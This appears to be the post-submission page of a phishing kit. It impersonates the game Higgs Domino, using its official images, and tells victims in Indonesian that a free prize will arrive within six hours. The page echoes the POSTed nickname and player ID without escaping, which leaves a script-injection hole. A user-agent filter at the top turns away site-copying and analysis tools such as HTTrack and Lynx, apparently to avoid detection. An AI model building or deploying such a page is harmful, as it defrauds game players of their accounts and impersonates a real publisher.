<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENANGKAP DATA YANG DI-INPUT
$nickname = $_POST['nickname'];
$playid = $_POST['playid'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($nickname == "" && $playid == ""){
header("Location: index.php");
}
?>
<html>
 <head> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"> 
  <link rel="preconnect" href="https://fonts.googleapis.com"> 
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin=""> 
  <link href="https://fonts.googleapis.com/css2?family=Rubik&amp;display=swap" rel="stylesheet"> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css"> 
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css"> 
  <link rel="stylesheet" href="haykaljb/css/alex-facebook.css"> 
  <link rel="stylesheet" type="text/css" href="haykaljb/css/style.css"> 
  <title>Higgs Domino</title> 
  <meta property="og:title" content="Higgs Domino"> 
  <meta name="description" content="Ambil Benefit dan Hadiah Higgs Domino secara gratis!"> 
  <meta property="og:description" content="Ambil Benefit dan Hadiah Higgs Domino secara gratis!"> 
  <meta property="og:url" content="./"> 
  <meta property="og:site_name" content="Higgs Domino"> 
  <meta property="og:type" content="website"> 
  <meta name="copyright" content="Alex Ariandi"> 
  <meta name="theme-color" content="#39919c"> 
  <meta property="og:image" content="https://raw.githubusercontent.com/jefanya14/higgs-domino-v16/main/higgs_domino.webp"> 
  <link rel="icon" href="https://www.bosbosgames.com/favicon.ico"> 
 </head> 
 <body> 
  <div id="container"> 
   <div class="container"> 
    <main> 
     <header> 
      <div class="boxname"> 
       <img src="https://raw.githubusercontent.com/jefanya14/higgs-domino-v16/main/higgs_domino.webp" alt="icon"> 
       <div class="textname"> 
        <label id="toastnick"><?php echo $nickname;?></label> 
        <label id="toastplayid"><?php echo $playid;?></label> 
       </div> 
      </div> 
      <div class="boxlight"> 
       <label id="echolog" style="display: none">Login</label> 
       <label id="echoout" onclick="location.href='./'">Log Out</label> 
      </div> 
     </header> 
     <section class="banner"> 
      <div class="imageslide"> 
       <figure class="sliderbanner" style="display: block;"> 
        <img src="https://static.neptunegame.com/images/website/img_swiper_2_01.png" alt="banner"> 
       </figure> 
       <figure class="sliderbanner" style="display: none;"> 
        <img src="https://static.neptunegame.com/images/website/img_swiper_2_02_1.png" alt="banner"> 
       </figure> 
       <figure class="sliderbanner" style="display: none;"> 
        <img src="https://static.neptunegame.com/images/website/img_swiper_2_03_1.png" alt="banner"> 
       </figure> 
       <figure class="sliderbanner" style="display: none;"> 
        <img src="https://static.neptunegame.com/images/website/img_swiper_2_04.png" alt="banner"> 
       </figure> 
       <figure class="sliderbanner" style="display: none;"> 
        <img src="https://static.neptunegame.com/images/website/img_swiper_2_05.png" alt="banner"> 
       </figure> 
       <figure class="sliderbanner" style="display: none;"> 
        <img src="https://static.neptunegame.com/images/website/img_swiper_2_06.png" alt="banner"> 
       </figure> 
       <figure class="sliderbanner" style="display: none;"> 
        <img src="https://static.neptunegame.com/images/website/img_swiper_2_07.png" alt="banner"> 
       </figure> 
      </div> 
      <div style="display: none"> 
       <span class="dot active"></span> 
       <span class="dot"></span> 
       <span class="dot"></span> 
      </div> 
     </section> 
     <section class="subtitle"> 
      <p>Selamat </p> 
     </section> 
     <section class="suksesalex"> 
      <div class="boxsuccess"> 
       <img src="img/gift_front.png" alt="hadiah"> 
       <h3>Hadiah segera dikirim paling lambat 6 Jam</h3> 
       <p>Silahkan cek inbox secara berkala</p> 
       <button onclick="location.href='./'">Tentukan</button> 
      </div> 
     </section> 
     <footer> 
      <div class="topfoot"> 
       <div class="imagefoot"> 
        <img src="https://static.neptunegame.com/images/website/ico_facebook.png" alt="sosmed"> 
        <img src="https://static.neptunegame.com/images/website/ico_mail.png" alt="sosmed"> 
        <img src="https://static.neptunegame.com/images/website/ins.png" alt="sosmed"> 
        <img src="https://static.neptunegame.com/images/website/cooperation.png" alt="sosmed"> 
       </div> 
       <img src="https://static.neptunegame.com/images/website/ico_top.png" alt="gotop"> 
      </div> 
      <copyright>
       Seluruh hak cipta.Terhubung dengan Kami!
      </copyright> 
     </footer> 
    </main> 
   </div> 
  </div> 
  <iframe scrolling="no" allow="autoplay" controls="" loop="" src="" style="display: none" width="0" height="0" frameborder="no"></iframe> 
  <script>
            var slideIndex = 0;
            showSlides();
            
            function showSlides() {
              var i;
              var slides = document.getElementsByClassName("sliderbanner");
              var dots = document.getElementsByClassName("dot");
              for (i = 0; i < slides.length; i++) {
                slides[i].style.display = "none";  
              }
              slideIndex++;
              if (slideIndex > slides.length) {slideIndex = 1}    
              for (i = 0; i < dots.length; i++) {
                dots[i].className = dots[i].className.replace(" active", "");
              }
              slides[slideIndex-1].style.display = "block";  
              dots[slideIndex-1].className += " active";
              setTimeout(showSlides, 4000); // Change image every 4 seconds
            }
        </script> 
 </body>
</html>